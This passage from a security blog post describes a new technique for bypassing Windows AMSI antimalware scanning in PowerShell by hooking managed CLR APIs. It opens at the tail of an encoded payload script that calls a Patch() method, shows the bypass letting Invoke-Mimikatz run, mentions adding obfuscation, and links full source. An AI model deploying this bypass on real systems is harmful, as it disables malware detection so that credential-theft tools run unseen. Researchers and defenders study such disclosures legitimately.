AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="));
[Editor.Methods]::Patch();
```

## Run the Bypass

Now we can run either PowerShell script to bypass AMSI.

![](https://i0.wp.com/practicalsecurityanalytics.com/wp-content/uploads/2022/11/Screenshot.png?resize=1024%2C468&quality=100&ssl=1)**Left:** a plain console without an AMSI bypass blocks the execution of the command “Invoke-Mimikatz”. **Right:** running Invoke-Mimikatz is allowed on the right after the bypass script is run.

## Employment Considerations and Limitations

- Cannot be executed from native code unlike hooking the AmsiScanBuffer.
- Less likely to be blocked than hooking native APIs.
- Works against both PowerShell 3.0+ and PowerShell Core.
- Will likely require some obfuscation after release.

## Conclusion

I have presented a new technique for bypassing AMSI that works on all applicable versions of PowerShell. It is more challenging to detect and prevent than native API call hooking, but achieves the same goal.

Download the full source code from Github: [https://github.com/pracsec/AmsiBypassHookManagedAPI](https://github.com/pracsec/AmsiBypassHookManagedAPI)

### Share this:

- [Share on X (Opens in new window)X](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/?share=twitter&nb=1)
- [Share on Reddit (Opens in new window)Reddit](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/?share=reddit&nb=1)

## Related Posts

[![Threat Hunting with File Entropy](https://i0.wp.com/practicalsecurityanalytics.com/wp-content/uploads/2019/10/Picture1.png?fit=856%2C709&quality=100&ssl=1)](https://practicalsecurityanalytics.com/file-entropy/)

[![Threat Hunting with the PE Checksum](https://i0.wp.com/practicalsecurityanalytics.com/wp-content/uploads/2019/10/pechecksum.png?fit=868%2C709&quality=100&ssl=1)](https://practicalsecurityanalytics.com/pe-checksum/)

### 11 thoughts on “New AMSI Bypass Using CLR Hooking”

01. Pingback: [New AMSI Bypass Using CLR Hooking ... - Bug Bounty Tips](https://bugbountytip.tech/2023/01/new-amsi-bypass-using-clr-hooking/)

02. Pingback: [New AMSI Bypass Using CLR Hooking – Severins kleine Cyber Seite](https://severinwinkler.at/index.php/2023/01/04/new-amsi-bypass-using-clr-hooking/)

03. Pingback: [New AMSI Bypass Using CLR Hooking - MalwareHelp.com](https://malwarehelp.com/index.php/2022/12/28/new-amsi-bypass-using-clr-hooking-2/malware-security-news/admin/)

04. Pingback: [New AMSI Bypass Using CLR Hooking - MalwareAlert.com](https://malwarealert.com/index.php/2022/12/28/new-amsi-bypass-using-clr-hooking-2/malware-security-news/admin/)

05. Pingback: [New AMSI Bypass Using CLR Hooking - WhatIsSpyware.com](https://whatisspyware.com/index.php/2022/12/28/new-amsi-bypass-using-clr-hooking/malware-security-news/admin/)

06. Pingback: [New AMSI Bypass Using CLR Hooking - WhatIsAdware.com](https://whatisadware.com/index.php/2022/12/28/new-amsi-bypass-using-clr-hooking/malware-security-news/admin/)

07. Pingback: [New AMSI Bypass Using CLR Hooking - Malware](https://malware.ws/index.php/2022/12/28/new-amsi-bypass-using-clr-hooking/malware-security-news/admin/)

08. Pingback: [New AMSI Bypass Using CLR Hooking - MalwareList.com](https://malwarelist.com/index.php/2022/12/28/new-amsi-bypass-using-clr-hooking-2/malware-security-news/admin/)

09. Pingback: [New AMSI Bypass Using CLR Hooking - Adware.us](https://adware.us/index.php/2022/12/28/new-amsi-bypass-using-clr-hooking-2/malware-security-news/admin/)

10. Pingback: [New AMSI Bypass Using CLR Hooking - NoJoke.xyz](https://nojoke.xyz/index.php/2022/12/28/new-amsi-bypass-using-clr-hooking-3/malware-security-news/admin/)

11. Pingback: [New AMSI Bypass Using CLR Hooking - AdwareInformation.com](https://adwareinformation.com/index.php/2022/12/28/new-amsi-bypass-using-clr-hooking-2/malware-security-news/admin/)


### Leave a Comment [Cancel Reply](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/\#respond)

Your email address will not be published.Required fields are marked \*

Type here..

Name\*

Email\*

Website

Notify me of follow-up comments by email.

Notify me of new posts by email.

Current ye@r \*

Leave this field empty

Scroll to Top